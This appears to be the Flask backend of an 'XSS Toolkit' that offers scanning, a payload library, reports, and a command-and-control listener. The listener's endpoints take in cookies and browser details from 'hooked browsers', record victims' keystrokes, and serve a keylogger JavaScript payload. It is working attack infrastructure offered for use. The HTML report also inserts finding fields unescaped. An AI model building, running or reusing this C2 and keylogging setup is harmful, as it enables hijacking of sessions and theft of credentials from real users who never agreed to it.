"""
XSS Toolkit — Main Flask backend server.

Serves the dashboard frontend and exposes REST APIs for scanning,
C2 listener management, payload library, and reporting.

Usage:
    python server.py
"""

import os
import io
import csv
import json
import time

from flask import (
    Flask, request, jsonify, send_from_directory,
    Response, make_response,
)
from flask_cors import CORS

from models import DataStore
from payloads import get_all_payloads, search_payloads
from scanner import scanner
from c2_listener import c2_server

# ── App setup ─────────────────────────────────────────────────────────────────

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

app = Flask(__name__, static_folder=BASE_DIR, static_url_path="")
CORS(app)

store = DataStore()


# ══════════════════════════════════════════════════════════════════════════════
#  FRONTEND — serve static files
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/")
def index():
    return send_from_directory(BASE_DIR, "index.html")


@app.route("/<path:filename>")
def static_files(filename):
    return send_from_directory(BASE_DIR, filename)


# ══════════════════════════════════════════════════════════════════════════════
#  API — Dashboard stats
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/stats")
def api_stats():
    return jsonify({
        "scans": store.stats["scans"],
        "vulns": store.stats["vulns"],
        "sessions": store.stats["sessions"],
        "blocked": store.stats["blocked"],
    })


@app.route("/api/activity")
def api_activity():
    return jsonify(store.activity_log)


@app.route("/api/activity", methods=["DELETE"])
def api_clear_activity():
    store.clear_activity()
    return jsonify({"status": "cleared"})


# ══════════════════════════════════════════════════════════════════════════════
#  API — Payloads
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/payloads")
def api_payloads():
    ptype = request.args.get("type", "all")
    query = request.args.get("q", "")
    results = search_payloads(query, ptype if ptype != "all" else None)
    return jsonify(results)


# ══════════════════════════════════════════════════════════════════════════════
#  API — Scanner
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/scan/start", methods=["POST"])
def api_scan_start():
    data = request.get_json(force=True, silent=True) or {}
    target = data.get("url", "").strip()

    if not target:
        return jsonify({"error": "Missing target URL"}), 400
    if not target.startswith(("http://", "https://")):
        return jsonify({"error": "URL must start with http:// or https://"}), 400

    config = {
        "depth": int(data.get("depth", 2)),
        "threads": int(data.get("threads", 4)),
        "timeout": int(data.get("timeout", 8)),
        "waf": bool(data.get("waf", False)),
        "dom": bool(data.get("dom", True)),
        "template": bool(data.get("template", False)),
    }

    result = scanner.start(target, config)
    return jsonify(result)


@app.route("/api/scan/stop", methods=["POST"])
def api_scan_stop():
    result = scanner.stop()
    return jsonify(result)


@app.route("/api/scan/status")
def api_scan_status():
    return jsonify(scanner.get_status())


@app.route("/api/scan/logs")
def api_scan_logs():
    return jsonify(list(store.scan_logs))


@app.route("/api/scan/logs", methods=["DELETE"])
def api_clear_scan_logs():
    store.clear_logs()
    return jsonify({"status": "cleared"})


# ══════════════════════════════════════════════════════════════════════════════
#  API — Findings / Reports
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/findings")
def api_findings():
    vuln_type = request.args.get("type", "all")
    severity = request.args.get("severity", "all")
    findings = store.get_findings(vuln_type, severity)
    return jsonify([f.to_dict() for f in findings])


@app.route("/api/findings", methods=["DELETE"])
def api_clear_findings():
    store.clear_findings()
    return jsonify({"status": "cleared"})


@app.route("/api/findings/export/<fmt>")
def api_export_findings(fmt):
    findings = store.get_findings()
    data = [f.to_dict() for f in findings]

    if fmt == "json":
        resp = make_response(json.dumps(data, indent=2))
        resp.headers["Content-Type"] = "application/json"
        resp.headers["Content-Disposition"] = "attachment; filename=scan_report.json"
        return resp

    if fmt == "csv":
        si = io.StringIO()
        writer = csv.writer(si)
        writer.writerow(["Type", "Severity", "URL", "Field", "Payload", "Time"])
        for f in data:
            writer.writerow([
                f["type"], f["severity"], f["url"],
                f["field"], f["payload"], f["time"],
            ])
        resp = make_response(si.getvalue())
        resp.headers["Content-Type"] = "text/csv"
        resp.headers["Content-Disposition"] = "attachment; filename=scan_report.csv"
        return resp

    if fmt == "html":
        rows = "".join(
            f'<tr><td>{i+1}</td><td>{f["type"]}</td><td>{f["severity"]}</td>'
            f'<td>{f["url"]}</td><td>{f["field"]}</td><td>{f["time"]}</td></tr>'
            for i, f in enumerate(data)
        )
        html = f"""<!DOCTYPE html><html><head><title>XSS Report</title>
<style>body{{font-family:monospace;background:#0a0c10;color:#e2e8f0;padding:20px}}
table{{border-collapse:collapse;width:100%}}th,td{{border:1px solid #333;padding:8px;text-align:left}}
th{{background:#161b26}}</style></head><body>
<h2>XSS Scan Report</h2>
<p>Generated: {time.strftime("%Y-%m-%d %H:%M:%S")}</p>
<table><thead><tr><th>#</th><th>Type</th><th>Severity</th><th>URL</th><th>Field</th><th>Time</th></tr></thead>
<tbody>{rows}</tbody></table></body></html>"""
        resp = make_response(html)
        resp.headers["Content-Type"] = "text/html"
        resp.headers["Content-Disposition"] = "attachment; filename=scan_report.html"
        return resp

    return jsonify({"error": "Invalid format. Use json, csv, or html."}), 400


# ══════════════════════════════════════════════════════════════════════════════
#  API — C2 Listener
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/c2/start", methods=["POST"])
def api_c2_start():
    data = request.get_json(force=True, silent=True) or {}
    host = data.get("host", "127.0.0.1")
    port = int(data.get("port", 9000))
    token = data.get("token", "")
    result = c2_server.start(host, port, token or None)
    return jsonify(result)


@app.route("/api/c2/stop", methods=["POST"])
def api_c2_stop():
    result = c2_server.stop()
    return jsonify(result)


@app.route("/api/c2/status")
def api_c2_status():
    return jsonify(c2_server.get_status())


@app.route("/api/c2/sessions")
def api_c2_sessions():
    sessions = c2_server.get_sessions()
    return jsonify([s.to_dict() for s in sessions])


@app.route("/api/c2/keystrokes")
def api_c2_keystrokes():
    session_id = request.args.get("session_id")
    keystrokes = c2_server.get_keystrokes(session_id)
    return jsonify([k.to_dict() for k in keystrokes])


@app.route("/api/c2/keystrokes", methods=["DELETE"])
def api_c2_clear_keystrokes():
    c2_server.clear_keystrokes()
    return jsonify({"status": "cleared"})


# ── C2 endpoints for hooked browsers ──────────────────────────────────────────

@app.route("/api/c2/log", methods=["POST"])
def api_c2_log():
    """Receive session check-in from a hooked browser."""
    data = request.get_json(force=True, silent=True) or {}
    token = data.get("token", "")

    if not c2_server.validate_token(token):
        return jsonify({"error": "Unauthorized"}), 403

    ip = request.remote_addr or data.get("ip", "unknown")
    user_agent = data.get("user_agent", request.headers.get("User-Agent", ""))
    cookies = data.get("cookies", "")

    session = c2_server.register_session(ip, user_agent, cookies)
    if session:
        return jsonify({"status": "ok", "session_id": session.id})
    return jsonify({"error": "C2 not active"}), 503


@app.route("/api/c2/keys", methods=["POST"])
def api_c2_keys():
    """Receive keystrokes from a hooked browser."""
    data = request.get_json(force=True, silent=True) or {}
    token = data.get("token", "")

    if not c2_server.validate_token(token):
        return jsonify({"error": "Unauthorized"}), 403

    ip = request.remote_addr or "unknown"
    key = data.get("key", "")
    session_id = data.get("session_id", "")

    if key:
        c2_server.log_keystroke(session_id, ip, key)
        return jsonify({"status": "ok"})
    return jsonify({"error": "No key provided"}), 400


@app.route("/api/c2/payload.js")
def api_c2_payload_js():
    """Serve the keylogger JavaScript payload."""
    js = c2_server.get_keylogger_js()
    return Response(js, mimetype="application/javascript")


# ── Payload server toggle ─────────────────────────────────────────────────────

@app.route("/api/ps/start", methods=["POST"])
def api_ps_start():
    data = request.get_json(force=True, silent=True) or {}
    port = int(data.get("port", 8080))
    result = c2_server.start_payload_server(port)
    return jsonify(result)


@app.route("/api/ps/stop", methods=["POST"])
def api_ps_stop():
    result = c2_server.stop_payload_server()
    return jsonify(result)


@app.route("/api/ps/status")
def api_ps_status():
    return jsonify(store.ps_state)


# ══════════════════════════════════════════════════════════════════════════════
#  Run
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("=" * 60)
    print("  XSS Toolkit — Backend Server")
    print("  Dashboard:  http://127.0.0.1:5000")
    print("  API Base:   http://127.0.0.1:5000/api")
    print("=" * 60)
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
